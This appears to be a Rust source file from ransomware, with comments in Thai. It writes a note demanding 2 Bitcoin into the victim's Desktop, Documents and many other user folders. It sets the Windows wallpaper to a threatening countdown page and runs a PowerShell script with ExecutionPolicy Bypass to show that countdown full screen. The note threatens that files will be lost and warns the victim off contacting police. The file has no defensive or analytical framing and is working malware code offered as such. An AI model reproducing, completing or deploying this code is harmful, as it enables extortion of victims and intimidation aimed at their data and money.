use std::fs::File;
use std::io::Write;
use std::path::Path;
use walkdir::WalkDir;
use chrono::{Duration, Utc};

const RANSOM_NOTE_CONTENT: &str = r#"=== YOUR FILES ARE ENCRYPTED ===

All your important files have been encrypted with military-grade encryption.
There is no way to recover them without our decryption tool.

To get your files back:
1. Pay 2 Bitcoin (BTC) within 72 hours to this address:
   bc1qxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

2. After payment, send transaction ID to our email:
   recoverfiles@protonmail.com
   or contact us via Tor: http://xxxxxxxxxxxxxxxx.onion

3. You will receive the decryptor within 24 hours after confirmation.

Do NOT try to recover files yourself - it will make them permanently lost.
Do NOT contact law enforcement - they cannot help you.

Time is running out...
"#;

pub fn drop_ransom_notes() {
    let user_profile = std::env::var("USERPROFILE").unwrap_or_else(|_| "C:\\Users\\Public".to_string());
    let desktop = Path::new(&user_profile).join("Desktop");
    let documents = Path::new(&user_profile).join("Documents");

    // วางบน Desktop และ Documents ก่อนเลย
    let important_places = vec![desktop, documents];

    for place in important_places {
        if place.exists() {
            let note_path = place.join("!!!_HOW_TO_GET_YOUR_FILES_BACK_!!!.txt");
            if let Ok(mut file) = File::create(note_path) {
                let _ = file.write_all(RANSOM_NOTE_CONTENT.as_bytes());
            }
        }
    }

    // วางในทุกโฟลเดอร์ที่เรา encrypt ไฟล์ไปแล้ว
    for dir in ["Documents", "Pictures", "Desktop", "Downloads", "Music", "Videos"] {
        let base_path = Path::new(&user_profile).join(dir);
        if !base_path.exists() {
            continue;
        }

        for entry in WalkDir::new(&base_path).max_depth(3).into_iter().filter_map(|e| e.ok()) {
            if entry.path().is_dir() {
                let note_path = entry.path().join("HOW_TO_DECRYPT.txt");
                if let Ok(mut file) = File::create(note_path) {
                    let _ = file.write_all(RANSOM_NOTE_CONTENT.as_bytes());
                }
            }
        }
    }
}

#[cfg(windows)]
pub fn change_wallpaper() {
    use std::process::Command;

    // ตั้ง deadline 72 ชั่วโมงจากตอนนี้
    let deadline = Utc::now() + Duration::hours(72);
    let deadline_js = deadline.timestamp_millis();

    // สร้างไฟล์ HTML ด้วย countdown timer แบบ fullscreen น่ากลัว
    let html_content = format!(r#"
    <html>
    <head>
    <title>YOUR FILES ARE ENCRYPTED - PAY NOW!</title>
    <style>
    body {{
        background-color: black;
        color: red;
        font-family: Arial, sans-serif;
        text-align: center;
        margin: 0;
        padding: 0;
        height: 100vh;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
    }}
    #main {{
        font-size: 72px;
        font-weight: bold;
        text-shadow: 0 0 20px red;
        animation: blink 1s infinite;
    }}
    #timer {{
        font-size: 120px;
        font-weight: bold;
        color: yellow;
        text-shadow: 0 0 30px yellow;
        margin: 50px 0;
    }}
    #warning {{
        font-size: 48px;
        margin: 30px 0;
    }}
    @keyframes blink {{
        0% {{ opacity: 1; }}
        50% {{ opacity: 0.5; }}
        100% {{ opacity: 1; }}
    }}
    </style>
    <script>
    function updateTimer() {{
        var now = new Date().getTime();
        var deadline = {};
        var distance = deadline - now;

        if (distance < 0) {{
            document.getElementById("timer").innerHTML = "TIME EXPIRED - FILES DELETED!";
            document.getElementById("warning").innerHTML = "YOUR DATA IS GONE FOREVER!";
            return;
        }}

        var days = Math.floor(distance / (1000 * 60 * 60 * 24));
        var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
        var seconds = Math.floor((distance % (1000 * 60)) / 1000);

        document.getElementById("timer").innerHTML = days + "d " + hours + "h " + minutes + "m " + seconds + "s ";
    }}

    setInterval(updateTimer, 1000);

    // พยายาม fullscreen
    document.addEventListener('DOMContentLoaded', function() {{
        if (document.documentElement.requestFullscreen) {{
            document.documentElement.requestFullscreen();
        }}
    }});
    </script>
    </head>
    <body>
    <div id="main">YOUR FILES ARE ENCRYPTED!</div>
    <div id="timer"></div>
    <div id="warning">
    Pay 2 BTC to recover your files<br>
    Check Desktop for payment instructions<br>
    TIME IS RUNNING OUT!
    </div>
    </body>
    </html>
    "#, deadline_js);

    let temp_path = std::env::temp_dir().join("warning.html");
    if let Ok(mut file) = File::create(&temp_path) {
        let _ = file.write_all(html_content.as_bytes());
    }

    // เปลี่ยนวอลเปเปอร์ด้วย regedit (Windows)
    let _ = Command::new("reg")
        .args(&[
            "add",
            "HKEY_CURRENT_USER\\Control Panel\\Desktop",
            "/v", "Wallpaper",
            "/t", "REG_SZ",
            "/d", temp_path.to_str().unwrap(),
            "/f"
        ])
        .output();

    let _ = Command::new("RUNDLL32.EXE")
        .args(&["user32.dll,UpdatePerUserSystemParameters"])
        .output();

    // สร้าง PowerShell script เพื่อเปิด countdown timer ใน fullscreen
    let ps_script = format!(r#"
    $htmlPath = "{}"
    $ie = New-Object -ComObject InternetExplorer.Application
    $ie.Navigate($htmlPath)
    $ie.Visible = $true
    $ie.FullScreen = $true
    "#, temp_path.to_str().unwrap().replace("\\", "\\\\"));

    let ps_path = std::env::temp_dir().join("timer.ps1");
    if let Ok(mut ps_file) = File::create(&ps_path) {
        let _ = ps_file.write_all(ps_script.as_bytes());
    }

    // รัน PowerShell script
    let _ = Command::new("powershell")
        .args(&["-ExecutionPolicy", "Bypass", "-File", ps_path.to_str().unwrap()])
        .spawn();
}